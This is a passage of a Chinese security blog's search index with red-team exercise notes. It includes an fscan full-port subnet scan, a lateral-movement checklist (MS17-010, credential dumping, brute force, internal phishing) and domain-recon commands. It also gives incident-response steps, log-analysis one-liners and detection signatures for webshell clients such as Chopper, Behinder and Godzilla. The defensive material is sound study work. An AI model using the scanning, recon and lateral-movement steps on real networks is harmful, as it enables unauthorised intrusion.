SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 2.多个端口探测 fscan https://github.com/shadow1ng/fscan fscan.exe -h 192.168.1.1/24 -p 1-65535 通过代理后使用nmap、msf进行扫描 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2多个端口探测"},{"categories":["hvv"],"content":"\r横向移动方法： 利用ms17010等系统漏洞 对跳板机密码进行抓取，使用抓取到密码爆破内网其他主机 利用EDR、堡垒机、云管平台、vmware esxi等集权系统漏洞 使用内网邮件服务进行邮件钓鱼 利用IPC$横向移动 smb爆破 对管理端口、数据库进行弱口令爆破 未授权访问漏洞 域渗透相关漏洞 虚拟机逃逸 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:4:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#横向移动方法"},{"categories":["hvv"],"content":"HVV专题–应急响应 常见的应急响应事件分类： **Web入侵：**网页挂马、主页篡改、Webshell **系统入侵：**病毒木马、勒索软件、远控后门 **网络攻击：**DDOS攻击、DNS劫持、ARP欺骗 基本思路流程： **收集信息：**收集客户信息和中毒主机信息，包括样本 **判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等 **抑制范围：**隔离使受害⾯不继续扩⼤ **深入分析：**日志分析、进程分析、启动项分析、样本分析方便后期溯源 **清理处置：**杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产 **产出报告：**整理并输出完整的安全事件报告 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#"},{"categories":["hvv"],"content":"\r入侵排查被入侵主机的排查流程： 定位被入侵的主机并且立即对该主机进行断网隔离 确定攻击类型 确定被入侵的时间范围 定位恶意文件和入侵痕迹 溯源入侵来源 清理恶意文件/修复漏洞 事件复盘 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#入侵排查"},{"categories":["hvv"],"content":"\rWindows入侵排查","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#windows入侵排查"},{"categories":["hvv"],"content":"\r检查系统账号安全查看服务器是否有弱口令，远程管理端口3389，22等端口是否对公网开放 可以问服务器管理人员，或者自行扫描测试 查看服务器是否存在可疑账号 Win+R-\u003elusrmgr.msc 看隐藏账号、克隆账号 创建用户时，在用户名后面加上$，就会创建成隐藏账号。 隐藏用户不能在 net user 和控制面板中看到，需要用其他的方式。 1、lusrmgr.msc 2、注册表HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/ 在cmd中输入：net user 看看有没有陌生用户 在cmd中输入：regedit 找到注册表分支 “HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/”看看有没有克隆用户（可以看到系统中的所有用户，包括隐藏用户） 关于克隆账号，看账号注册表中的F值和其他账号的F值是否相同 使用D盾_web查杀工具，集成了对克隆账号检测的功能 结合日志，查看管理员登录时间、用户名是否存在异常 Win+R-\u003eeventvwr.msc 导出Windows的安全日志，利用LogParser进行分析 同时也要注意查看administrators组中是否存在赋权异常的账号。比如正常情况下guest用户处于禁用状态、普通应用账户(weblogic、apache、mysql)不需要在administrators组中。如下图，执行命令net user guest查看guest账号的信息，如果guest账号被启用，且在管理员组成员中有guest用户，需要询问客户运维人员该guest账户启用的必要性以及加入管理组是否有必要，否则可认为攻击者将系统自带用户guest启用并提权至管理员组后作为后门账号使用。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查系统账号安全"},{"categories":["hvv"],"content":"\r检查系统账号安全查看服务器是否有弱口令，远程管理端口3389，22等端口是否对公网开放 可以问服务器管理人员，或者自行扫描测试 查看服务器是否存在可疑账号 Win+R-\u003elusrmgr.msc 看隐藏账号、克隆账号 创建用户时，在用户名后面加上$，就会创建成隐藏账号。 隐藏用户不能在 net user 和控制面板中看到，需要用其他的方式。 1、lusrmgr.msc 2、注册表HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/ 在cmd中输入：net user 看看有没有陌生用户 在cmd中输入：regedit 找到注册表分支 “HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/”看看有没有克隆用户（可以看到系统中的所有用户，包括隐藏用户） 关于克隆账号，看账号注册表中的F值和其他账号的F值是否相同 使用D盾_web查杀工具，集成了对克隆账号检测的功能 结合日志，查看管理员登录时间、用户名是否存在异常 Win+R-\u003eeventvwr.msc 导出Windows的安全日志，利用LogParser进行分析 同时也要注意查看administrators组中是否存在赋权异常的账号。比如正常情况下guest用户处于禁用状态、普通应用账户(weblogic、apache、mysql)不需要在administrators组中。如下图，执行命令net user guest查看guest账号的信息，如果guest账号被启用，且在管理员组成员中有guest用户，需要询问客户运维人员该guest账户启用的必要性以及加入管理组是否有必要，否则可认为攻击者将系统自带用户guest启用并提权至管理员组后作为后门账号使用。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#看隐藏账号克隆账号"},{"categories":["hvv"],"content":"\r检查异常端口、进程检查端口连接情况，是否有远程连接、可疑连接 netstat -ano tasklist | find \"PID\" 进程 开始--运行--输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。 使用D盾，查看可以进程，查看有没有签名信息，或者可以使用Process Explorer等工具查看 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查异常端口进程"},{"categories":["hvv"],"content":"\r检查启动项、计划任务、服务检查服务器是否有异常的启动项 火绒等安全软件查看 Win+R-\u003eregedit，打开注册表，查看开机启动项是否正常，特别注意一下三个注册表项 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce 检查计划任务 控制面板-\u003e计划任务 Win+R-\u003ecmd-\u003eschtasks/at 服务自启动 Win+R-\u003eservices.msc 查看组策略 在无法使用工具、只能手工排查的情况下，可查看常见的自启项手否有异常文件。打开gpedit.msc–计算机配置/用户配置–Windows设置–脚本，在此处可设置服务器启动/关机或者用户登录/注销时执行的脚本。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查启动项计划任务服务"},{"categories":["hvv"],"content":"\r检查系统相关信息查看系统版本以及补丁信息 Win+R-\u003ecmd-\u003esysteminfo 查看可以目录及文件 查看用户目录，新建账号会生成一个用户目录 Win+R-\u003ecmd-\u003e%UserProfile%\\Recent：查看最近打开的文件进行分析 文件夹/文件可以根据时间排序，可以看看最近有没有什么可疑的文件夹/文件 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查系统相关信息"},{"categories":["hvv"],"content":"\r自动化查杀病毒查杀 下载安全软件，更新病毒库，进行全盘扫描 Webshell查杀 选择具体站点路径进行webshell查杀，建议最少选择两款查杀工具，可以互相补充规则库的不足 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#自动化查杀"},{"categories":["hvv"],"content":"\r日志分析系统日志 前提：开启审核策略 Win+R-\u003eeventvwr.msc-\u003e导出安全日志-\u003eLogParser进行分析 Web访问日志 找到中间件的web日志，打包到本地进行分析 Linux下可以使用Shell命令组合查询分析 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#日志分析"},{"categories":["hvv"],"content":"\rWindows安全事件ID 系统： 1074，通过这个事件ID查看计算机的开机、关机、重启的时间以及原因和注释。 6005，表示计算机日志服务已启动，如果出现了事件ID为6005，则表示这天正常启动了系统。 104，这个时间ID记录所有审计日志清除事件，当有日志被清除时，出现此事件ID。 安全： 4624，这个事件ID表示成功登陆的用户，用来筛选该系统的用户登陆成功情况。 4625，这个事件ID表示登陆失败的用户。 4720,4722,4723,4724,4725,4726,4738,4740,事件ID表示当用户帐号发生创建，删除，改变密码时的事件记录。 4727,4737,4739,4762,事件ID表示当用户组发生添加、删除时或组内添加成员时生成该事件。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#windows安全事件id"},{"categories":["hvv"],"content":"\rLinux入侵排查","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#linux入侵排查"},{"categories":["hvv"],"content":"\r账号安全 用户信息文件/etc/passwd 影子文件/etc/shadow 命令： who查看当前登录用户(tty本地登陆pts远程登录) w查看系统信息，想知道某一时刻用户的行为 uptime查看登陆多久、多少用户，负载 入侵排查 查询特权用户：awk -F: ‘$3==0{print $1}’ /etc/passwd 查询可以远程登录的账号：awk ‘/\\$1|\\$6/{print $1}’ /etc/shadow 查询具有sudo权限的账号：more /etc/sudoers | grep -v “^#\\|^$” grep “ALL=(ALL)” 禁用或删除多余及可疑的帐号： usermod -L user 禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头 userdel user 删除user用户 userdel -r user 将删除user用户，并且将/home目录下的user目录一并删除 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#账号安全"},{"categories":["hvv"],"content":"\r历史命令 必会命令：history 入侵排查：cat .bash_history »history.txt ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#历史命令"},{"categories":["hvv"],"content":"\r检查异常端口 netstat -antlp|more 查看下pid所对应的进程文件路径， 运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号） ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查异常端口"},{"categories":["hvv"],"content":"\r检查异常进程 #查看当前开放端口 netstat -tnlp #查看当前系统上运行的所有进程 ps -ef #查看进程 ps aux | grep pid #可以直接看到进程实时情况 top #查看cpu占用率前十的进程，互补top命令 ps aux --sort=pcpu | head -10 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查异常进程"},{"categories":["hvv"],"content":"\r检查开机启动项当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链 接即可 more /etc/rc.local /etc/rc.d/rc[0-6].d ls -l /etc/rc.d/rc3.d/ ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查开机启动项"},{"categories":["hvv"],"content":"\r检查定时任务检查以下目录下是否有可疑文件 /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* /etc/cron.daily/* ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查定时任务"},{"categories":["hvv"],"content":"\r检查服务 chkconfig 修改/etc/re.d/rc.local文件，加入/etc/init.d/httpd start 使用nesysv命令管理自启动 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查服务"},{"categories":["hvv"],"content":"\r检查异常文件 查看敏感目录，如tmp目录下的文件，同时注意隐藏文件夹，以”..”为名的文件夹具有隐藏属性 得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ 可以使用ﬁnd命令来查找，如 ﬁnd /opt -iname \"*\" -atime 1 -type f 找出 /opt 下一天前访问过的文件 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:8","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查异常文件"},{"categories":["hvv"],"content":"\r检查系统日志\r日志默认存放位置：/var/log 日志分析技巧 1、定位有多少IP在爆破主机的root帐号： grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 爆破用户名字典是什么？ grep \"Failed password\" /var/log/secure|perl -e 'while($_=\u003c\u003e){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5、su切换用户： Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown - ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:9","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#检查系统日志"},{"categories":["hvv"],"content":"\r动态链接库 遇到挖矿病毒，往往用ps，top等命令是看不到异常的，且即使kill掉进程和计划任务项往往过一会进程就会重新起来。这种情况往往是存在预加载恶意动态链接库的后门 使用 readelf -Ws /bin/ls 查看ls命令调用的库函数 警惕利用Linux预加载型恶意动态链接库的后门 应急响应系列之Linux库文件劫持技术分析 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:2:10","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#动态链接库"},{"categories":["hvv"],"content":"\rWindows加固思路 在 win ser2016 中如何管理重命名 administrator, 禁用 GUEST 系统不显示上次登录的账户名。 清理系统无效账户. 按用户类型分配账号 配置密码策略 账户锁定策略 远端系统强制关机设置,只指派给Administrators组 本地关机设置,只指派给Administrators组 用户权限指派 授权账户本地登录 授权账户从网络访问 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:3:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#windows加固思路"},{"categories":["hvv"],"content":"\rWindows命令 netstat -ano 查看开放端口 systeminfo 查看系统信息 net user 用户名/delete. 删除用户 ipconfig/all 查看网络信息 shell whoami/all 查看所有用户信息 wmic process list brief 查询进程信息 wmic startup get command,caption 查看启动程序信息 shell tasklist 查看常见的杀毒软件进程 hostname 获取dns信息 net view 查看当前局域网中的计算机列表 net user 查看当前计算机中的用户 systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\" 查询操作系统及软件信息 echo %PROCESSOR_ARCHITECTURE% 查看系统体系结构 powershell \"Get-WmiObject -class Win32_Product |Select-Object -Property name, version\" 使用PowerShell收集软件的版本信息 whoami \u0026\u0026 whoami /priv 查看当前权限 wmic service list brief 查询本机服务信息 wmic product get name, version 查看安装的软件的版本、路径等 shell net view /domain 查看主域信息 shell net time /domain 查看时间服务器 shell net config workstation 查看当前的登录域与用户信息 nslookup god.org 寻找域dns服务器ip ","date":"2023-11-17","objectID":"/hvv_emergency_response/:4:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#windows命令"},{"categories":["hvv"],"content":"\rLinux加固思路 删除无用账号 检查特殊账号 添加口令策略 限制su 进制root直接登录 设置隐藏文件属性(先最小,后加) 关闭不必要服务 更改ssh端口号 防爆破 记录日志 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:5:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#linux加固思路"},{"categories":["hvv"],"content":"\rwebshell 流量信息","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#webshell-流量信息"},{"categories":["hvv"],"content":"\rWebshell流量监测思路**1、特征分析：**分析流量特征中的关键特征，判断是否存在webshell流量特征； **2、请求模式：**分析webshell流量的请求模式，可以通过分析URL，参数和头部信息来判断是否存在webshell流量； **3、检测内容：**通过分析流量中的关键字等特征，判断是否存在webshell流量特征； **4、字符集：**分析流量中的字符集是否webshell流量关联； **5、加密算法：**分析流量中的加密算法，判断是否存在webshell流量特征； **6、文件上传：**分析流量中是否存在文件上传性质等性质，判断是否存在webshell流量特征； **7、恶意脚本：**分析流量中是否存在恶意脚本，判断是否存在webshell流量特征； ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#webshell流量监测思路"},{"categories":["hvv"],"content":"\r菜刀请求体中传递的payload为base64编码 请求体中存在eval，base64等特征字符 传给cmd的这些流量字符中有自己的特征：1、都是系统命令；2、必须以分号结尾；3、数据包源一般是ip 还有一段以QG开头，7J结尾的固定代码。 中国菜刀2011版本及2014版本各语言WebShell链接流量特征 (1) PHP类WebShell链接流量 其中特征主要在body中，将body中流量进行url解码后如下： 其中特征点有如下三部分， 第一：“eval”，eval函数用于执行传递的攻击payload，这是必不可少的； 第二：(base64_decode($_POST[z0]))，(base64_decode($_POST[z0]))将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码，以避免被检测； 第三：\u0026z0=QGluaV9zZXQ…，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用Base64编码的，所以可以利用base64解码可以看到攻击明文。 注： 1.有少数时候eval方法会被assert方法替代。 2.$_POST也会被$_GET、$_REQUEST替代。 3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。 (2) JSP类WebShell链接流量： 该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A\u0026z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=参数用来加入攻击载荷。 注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。 (3) ASP类WebShell链接流量： 其中body流量进行URL解码后 其中特征点有如下三部分， 第一：“Execute”，Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数； 第二：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。 第三：Response.Write和Response.End是必有的，是来完善整个操作的。 这种流量主要识别这几部分特征，在正常流量中基本没有。 注：OnError Resume Next这个特征在大部分流量中存在，极少数情况没有。 中国菜刀2016版本各语言WebShell链接流量特征： (1) PHP类WebShell链接流量： 其中特征主要在body中，将body中部分如下： 这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。 其中特征点有如下三部分， 第一：““Ba”.“SE6”.“4_dEc”.“OdE”，这部分是将base64解码打断使用.来连接。 第二：@ev”.“al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。 第三：QGluaV9zZXQoImRpc3BsYXlf…，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。 注：有少数时候eval方法会被assert方法替代。 (2) JSP类WebShell链接流量： 该版本JSPwebshell流量与之前版本一样， 所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A\u0026z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。 注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。 (3) ASP类WebShell链接流量： 其中body流量为： 2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。 或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。 这种流量主要识别这几部分特征，在正常流量中基本没有。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#菜刀"},{"categories":["hvv"],"content":"\r蚁剑可以对流量进行加密、混淆，但有些关键代码没有被加密，如：PHP中的ini_set；ASP中的OnError，response 加密后后的数据包里面的参数大多都是_0x开头 payload用base64进行编码，数据包存在base加密的eval命令执行，数据包的payload内容存在几个分段内容，分别都使用base加密 （1）蚁剑PHP类WebShell链接流量 其中body流量进行URL解码后为： 其中流量最中明显的特征为@ini_set(“display_errors”,“0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现。 （2）蚁剑ASP类WebShell链接流量 其中body流量进行URL解码后为： 我们可以看出蚁剑针对ASP类的WebShell流量与菜刀的流量很像，其中特征也是相同，如OnError ResumeNext、Response.End、Response.Write，其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex”\u0026cHr(101)\u0026“cute，同时该流量中也使用了eval参数，可以被认为明显特征。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#蚁剑"},{"categories":["hvv"],"content":"\r冰蝎 3.0一款动态二进制加密网站管理客户端。主要用于配合服务端shell的动态二进制加密通信，适用于WAF拦截回显等场景，客户端的流量无法检测 最大特点是交互流量进行AES对称加密，且加密秘钥是由随机数函数动态生成,因此该客户端的流量几乎无法检测 功能比较全，webshell本体容易被查杀，需要做webshell本体的免杀 请求数据包中的content-type字段常见为application/octet-stream； PHP代码中可能存在eval、assert等关键词； jsp代码中可能会有get class(),get class loader()等字符特征 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#冰蝎-30"},{"categories":["hvv"],"content":"\r冰蝎 4.0增加了webshell生成功能，可以完全自定义流量加密方法，对流量加密的灵活性又大大增加 内置10个user-agent ,每次连接shell时会随机选择一个进行使用. 冰蝎4.0建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右 冰蝎通讯默认使用长连接，请求头和响应头里会带有 Connection且Connection为 Keep-Alive Accep和Content-Type为弱特征且Content-type:一般为Application/x-www-form-urlencoded，这里可作为辅助特征 有固定的请求头和响应头： 请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M 响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#冰蝎-40"},{"categories":["hvv"],"content":"\r哥斯拉是基于流量、HTTP全加密的webshell工具 全部类型的shell 能绕过市面所有静态查杀 哥斯拉流量加密能绕过市面全部流量waf user-agent,如果不修改的话会返回使用的jdk信息 在请求包的Cookie中有一个非常致命的特征是会在最后出现分号 请求Accept和响应中Cache-Control字段（辅助认证） 响应包中的数据前16位为MD5+base64+后16位为MD5。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#哥斯拉"},{"categories":["hvv"],"content":"\rWeevely信息 payload 放于 accetp 头中，采用 gzip 压缩传输，使用异或加密。进行 base64 加密 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:6:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#weevely"},{"categories":["hvv"],"content":"\rWebshell查杀工具","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#webshell查杀工具"},{"categories":["hvv"],"content":"\rD盾： http://www.d99net.net ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#d盾"},{"categories":["hvv"],"content":"\r百度WEBDIR+ https://scanner.baidu.com ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#百度webdir"},{"categories":["hvv"],"content":"\r河马 https://www.shellpub.com ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#河马"},{"categories":["hvv"],"content":"\rWeb Shell Detector http://www.shelldetector.com ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#web-shell-detector"},{"categories":["hvv"],"content":"\rCloudWalker(牧云) https://webshellchop.chaitin.cn ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#cloudwalker牧云"},{"categories":["hvv"],"content":"\r深度学习模型检测PHP Webshell http://webshell.cdxy.me ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#深度学习模型检测php-webshell"},{"categories":["hvv"],"content":"\rPHP Malware Finder https://github.com/jvoisin/php-malware-finder ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#php-malware-finder"},{"categories":["hvv"],"content":"\rfindWebshell https://github.com/he1m4n6a/findWebshell ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:8","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#findwebshell"},{"categories":["hvv"],"content":"\r在线Webshell查杀工具 http://tools.bugscaner.com/killwebshell ","date":"2023-11-17","objectID":"/hvv_emergency_response/:7:9","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#在线webshell查杀工具"},{"categories":["hvv"],"content":"\rRootkit查杀chkrootkit 网址：http://www.chkrootkit.org rkhunter http://rkhunter.sourceforge.net ","date":"2023-11-17","objectID":"/hvv_emergency_response/:8:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#rootkit查杀"},{"categories":["hvv"],"content":"\r病毒查杀Clamav ClamAV的官方下载地址为：http://www.clamav.net/download.html ","date":"2023-11-17","objectID":"/hvv_emergency_response/:9:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#病毒查杀"},{"categories":["hvv"],"content":"\r如何发现隐藏的Webshell后门那么多代码里不可能我们一点点去找后门，另外，即使最好的Webshell查杀软件也不可能完全检测出来所有的后门，这个时候我们可以通过检测文件的完整性来寻找代码中隐藏的后门。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:10:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#如何发现隐藏的webshell后门"},{"categories":["hvv"],"content":"\r文件MD5校验绝大部分软件，我们下载时都会有MD5文件，这个文件就是软件开发者通过md5算法计算出该如软件的“特征值”，下载下来后，我们可以对比md5的值，如果一样则表明这个软件是安全的，如果不一样则反之。 Linux中有一个命令：md5sum可以查看文件的md5值，同理，Windows也有命令或者工具可以查看文件的md5值 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:10:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#文件md5校验"},{"categories":["hvv"],"content":"\rDiff命令 Linux中的命令，可以查看两个文本文件的差异 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:10:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#diff命令"},{"categories":["hvv"],"content":"\r文件对比工具 Beyond Compare WinMerge 